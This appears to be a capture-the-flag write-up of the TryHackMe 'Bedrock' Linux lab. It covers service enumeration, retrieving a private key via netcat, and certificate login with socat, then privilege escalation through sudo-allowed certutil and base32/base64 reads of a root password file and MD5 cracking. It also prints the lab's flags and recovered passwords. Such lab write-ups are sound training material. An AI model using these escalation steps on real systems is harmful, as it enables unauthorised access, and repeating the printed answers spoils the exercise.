# 🪨 TryHackMe — Bedrock

> **Custom Services | Certificate Authentication | SSH | Sudo Misconfiguration | Encoding | MD5 Cracking | Privilege Escalation**

![Difficulty](https://img.shields.io/badge/Difficulty-Easy-green)
![Platform](https://img.shields.io/badge/Platform-TryHackMe-00a98f?style=flat-square)
![Focus](https://img.shields.io/badge/Focus-Privilege%20Escalation-orange?style=flat-square)
![Status](https://img.shields.io/badge/Status-Completed-success?style=flat-square)

---

## 📌 Overview

**Bedrock** is a TryHackMe Linux-based machine focused on enumeration, custom services, certificate-based authentication, credential discovery, and privilege escalation.

The machine exposes several unusual services that provide clues about the authentication mechanism. By enumerating the services and interacting with them, we can obtain certificates and private keys.

The attack path is:

```text
Nmap Enumeration
       │
       ▼
Custom Services
       │
       ▼
Certificate / Private Key Disclosure
       │
       ▼
Barney SSH Access
       │
       ▼
sudo certutil
       │
       ▼
Fred Certificate + Private Key
       │
       ▼
Fred SSH Access
       │
       ▼
sudo base32 / base64
       │
       ▼
Encoded Root Password
       │
       ▼
MD5 Cracking
       │
       ▼
su root
       │
       ▼
🏁 Root Flag
```

---

# 🔎 1. Enumeration
Nmap Scan

I started with a full TCP port scan and service enumeration.
```
nmap -sV -p- 10.48.141.237
```
Results
```
22/tcp     open  ssh
80/tcp     open  http
4040/tcp   open  ssl/yo-main?
9009/tcp   open  pichat?
54321/tcp  open  ssl/unknown
```
The interesting ports were:

- **22** → SSH
- **80** → HTTP
- **9009** → Custom service
- **54321** → Secure/custom login service

<img width="592" height="244" alt="1" src="https://github.com/user-attachments/assets/a1ea0d5a-6807-4106-a983-f14349ce4f28" />

---

# 🌐 2. Web Enumeration

Opening port 80 in the browser revealed a simple webpage.
```
http://10.48.141.237
```
The webpage contained several useful clues.

It mentioned:

- Barney
- Database setup
- Something started on another port
- "From the toilet"
- "OVER 9000"
- Secure connections using certificates

These clues suggested that other services running on the machine were important.

<img width="762" height="429" alt="2" src="https://github.com/user-attachments/assets/5a500da7-5fbd-42b4-89fb-01e53f99d2f1" />

---

# 🔐 3. Enumerating Port 9009

I connected to port 9009 using Netcat.
```
nc -v 10.48.141.237 9009
```
The service asked:
```
What are you looking for?
```
Trying:
```
cert
```
returned a certificate.

The service also allowed us to request a private key.
```
What are you looking for? key
```
This gave us both:

- Certificate
- RSA private key

I saved them locally:
```
nano cert
nano key
```

<img width="693" height="357" alt="3" src="https://github.com/user-attachments/assets/1491cb4c-4cf8-4e0f-837a-4ab34204ef73" />
<img width="693" height="607" alt="3-2" src="https://github.com/user-attachments/assets/9568919d-54bb-4bab-985c-7ad8872e8bca" />
<img width="645" height="507" alt="3-3" src="https://github.com/user-attachments/assets/4ceb7bf0-a65e-440e-b4b5-7afaf86f13e7" />
<img width="322" height="92" alt="3-4" src="https://github.com/user-attachments/assets/439339d1-588a-4094-b5a6-68020a370065" />

---

# 🔑 4. Connecting to Port 54321

The HTTP service indicated that a secure login service was running on port `54321`.

It suggested using `socat` with the certificate and private key.
```
socat stdio ssl:10.48.141.237:54321,cert=cert,key=key,verify=0
```
The service authenticated the certificate and displayed:
```
Welcome: "Barney Rubble" is authorized
```
The service also provided a password hint.

The important information was:
```
Password hint: diad7c0a3805955a35eb260dab4180dd
User: Barney Rubble
```
The secure service provided a password hint/value for Barney. This value was used as the password for SSH authentication.

<img width="761" height="276" alt="4" src="https://github.com/user-attachments/assets/aac4f1f1-9ae4-4c48-b55e-f91d3091503b" />
<img width="626" height="182" alt="4-2" src="https://github.com/user-attachments/assets/9b02332e-ba99-483d-89cc-c86e58e348e0" />

---

# 5. SSH Connection

After recovering the password, I was able to authenticate through SSH.
```
ssh barney@10.48.141.237
```

<img width="626" height="130" alt="5" src="https://github.com/user-attachments/assets/31291467-066d-43a4-beaf-0ed1fb33bdb0" />

---

# 🏁 6. Barney User Flag

After logging in as Barney:
```
ls
```
There was a file:
```
barney.txt
```
Reading it:
```
cat barney.txt
```
**🚩 User Flag**
```
THM{f05780f08f0eb1de65023069d0e4c90c}
```

<img width="366" height="97" alt="5-2" src="https://github.com/user-attachments/assets/57e1e43b-3bcd-4703-b2a2-ff8140f82933" />


---

# 🔍 7. Local Enumeration

I checked the `/home` directory:
```
cd /home
ls
```
The machine contained several users:
```
barney
fred
ssm-user
ubuntu
```
<img width="299" height="69" alt="6" src="https://github.com/user-attachments/assets/1d2ba2b0-865d-46b7-a14c-5df1beb64f35" />

Since `fred` was another interesting user, I checked his home directory.
```
cd /home/fred
ls -la
```
The file `fred.txt` existed but could not be read by Barney.
```
cat fred.txt
```
Result:
```
Permission denied
```
<img width="581" height="275" alt="7" src="https://github.com/user-attachments/assets/1d8da891-6630-4152-b09d-4938f2348ac3" />

---

# ⚙️ 8. Sudo Enumeration

Next, I checked Barney's sudo privileges:
```
sudo -l
```
The important result was:
```
User barney may run the following commands:

(ALL : ALL) /usr/bin/certutil
```
This was significant because Barney could execute `certutil` with root privileges.

<img width="1018" height="115" alt="8" src="https://github.com/user-attachments/assets/e558087f-be38-4eff-8008-e9f525cc27a6" />


# 🧰 9. Exploring certutil

Running the binary without arguments showed its usage:
```
/usr/bin/certutil
```
The tool supported operations such as:
```
Show current certs:
certutil ls

Generate new keypair:
certutil [username] [fullname]
```
The existing certificates could be listed with:
```
certutil ls
```
The certificate directory contained certificates and private keys belonging to users such as Barney and Fred.

<img width="568" height="433" alt="9" src="https://github.com/user-attachments/assets/39ffdbc3-4fb6-4693-a551-6ced289e48e3" />

---

# 🔑 10. Certificate Generation / Fred Credentials

Because Barney could execute `certutil` with `sudo`, I used the functionality of the certificate utility to generate credentials.

The resulting certificate directory contained files associated with Fred.
```
/usr/share/abc/certs/
```
Among the files were:
```
fred.certificate.pem
fred.clientKey.pem
fred.csr.pem
fred.serviceKey.pem
```
The important file was:
```
fred.clientKey.pem
```

---

# 📜 11. Obtaining Fred's Private Key

The private key could be read from:
```
cat /usr/share/abc/certs/a.clientkey.pem
```
I copied the required certificate and key to my Kali machine.

<img width="619" height="176" alt="12" src="https://github.com/user-attachments/assets/b612cb89-c51e-4b04-87a7-fd65db4406ec" />

---

# 🔐 12. Authenticate as Fred

Using the certificate and private key, I connected to the secure service again:
```
socat stdio ssl:10.48.141.237:54321,cert=aCert,key=aKey,verify=0
```
The service authenticated the certificate.

The certificate identity was associated with the Fred account.

Since the service explicitly stated:
```
Login is disabled. Please use SSH instead.
```
I used the recovered credentials for SSH.
```
ssh fred@10.48.141.237
```

<img width="692" height="367" alt="13" src="https://github.com/user-attachments/assets/64274b73-1977-447b-af50-c8f813252b7a" />
<img width="612" height="153" alt="14" src="https://github.com/user-attachments/assets/11e03b11-69a8-4930-a88b-b275f3fd1c80" />

---

# 🏁 13. Fred User Flag

After logging in as Fred:
```
ls
cat fred.txt
```
The second user flag was obtained.

**🚩 Fred Flag**
```
THM{08da34e619da839b154521da7323559d}
```

<img width="554" height="196" alt="15" src="https://github.com/user-attachments/assets/80f5e8ee-ee32-4ec2-a358-e3bcff576d12" />

---

# 🧑‍💻 14. Fred Sudo Enumeration

I checked Fred's sudo permissions:
```
sudo -l
```
The important entries were:
```
(ALL : ALL) NOPASSWD: /usr/bin/base32 /root/pass.txt
(ALL : ALL) NOPASSWD: /usr/bin/base64 /root/pass.txt
```
This meant Fred could execute `base32` and `base64` against:
```
/root/pass.txt
```
with root privileges without providing a sudo password.

This provided a way to read the contents of the root-owned password file indirectly.

<img width="1015" height="145" alt="16" src="https://github.com/user-attachments/assets/5b9c0f61-6148-434c-91f7-24e557966070" />

---

# 🔐 15. Extracting the Root Password

Using the permitted commands:
```
sudo /usr/bin/base32 /root/pass.txt
```
and:
```
sudo /usr/bin/base64 /root/pass.txt
```
Both commands returned encoded data.

<img width="637" height="134" alt="17" src="https://github.com/user-attachments/assets/15228a12-296e-4459-b1f9-8d63d12efd8b" />

---

# 🔄 16. Decoding the Data

I copied the Base32 and Base64 output to Kali and decoded both values.

**Base32**
```
echo "<BASE32_DATA>" | base32 --decode
```
**Base64**
```
echo "<BASE64_DATA>" | base64 --decode
```
Both decoding operations resulted in the same value:
```
LFKEC52ZKRCXSWKXIZVU43KJGNMXURJSLFWVS52...
```
This value was itself encoded.

<img width="1218" height="167" alt="18" src="https://github.com/user-attachments/assets/cf5a255a-27c2-40f0-b4fc-77bf3257546c" />

---

# 🧩 17. Further Decoding

I used an encoding/decoding utility to determine the format.

The value could be processed as Base32 to obtain an MD5 hash:
```
a00a12aad6b7c16bf07032bd05a31d56
```

<img width="744" height="253" alt="19" src="https://github.com/user-attachments/assets/62ae27a7-dd5d-4136-9e06-7f7e12043567" />

---

# 🔓 18. Cracking the MD5 Hash

The resulting hash was:
```
a00a12aad6b7c16bf07032bd05a31d56
```
I identified it as an MD5 hash and cracked it.

The recovered password was:
```
flintstonesvitamins
```

<img width="957" height="345" alt="20" src="https://github.com/user-attachments/assets/0fbfd755-4536-4dc8-a0d7-aa1ab2a48845" />

---

# 👑 19. Root Access

With the recovered root password, I switched to the root account:
```
su root
```
Then:
```
cat /root/root.txt
```
**🏆 Root Flag**
```
THM{de4043c009214b56279982bf10a661b7}
```

<img width="441" height="90" alt="21" src="https://github.com/user-attachments/assets/945abd5c-4ca9-4591-8571-d7d8619a7402" />
